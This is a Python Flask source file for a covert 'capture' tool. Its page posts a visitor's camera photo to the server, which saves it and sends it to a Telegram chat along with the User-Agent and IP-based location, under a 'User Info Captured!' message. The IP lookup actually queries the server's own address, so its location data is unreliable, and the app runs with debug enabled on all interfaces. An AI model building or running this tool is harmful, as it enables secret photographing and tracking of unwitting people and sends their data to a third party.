from flask import Flask, request, render_template, jsonify
import requests
import telebot
import base64
import os
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env

TOKEN = os.getenv("TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")  # Load the webpage

@app.route("/capture", methods=["POST"])
def capture():
    data = request.json
    ip_data = requests.get("https://ipinfo.io/json").json()  # Get IP info
    photo_data = data.get("photo")  # Get base64 photo
    user_agent = request.headers.get('User-Agent')  # Get device details

    # Save the image
    with open("user_photo.jpg", "wb") as f:
        f.write(base64.b64decode(photo_data.split(",")[1]))

    # Send IP, location, and device info to Telegram
    message = f"🌐 **User Info Captured!**\n\n"
    message += f"🆔 IP: {ip_data['ip']}\n"
    message += f"📍 Location: {ip_data['city']}, {ip_data['region']}, {ip_data['country']}\n"
    message += f"📱 Device: {user_agent}\n"
    
    bot.send_message(CHAT_ID, message)

    # Send the captured photo
    with open("user_photo.jpg", "rb") as photo:
        bot.send_photo(CHAT_ID, photo)

    return jsonify({"message": "Data sent to Telegram"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
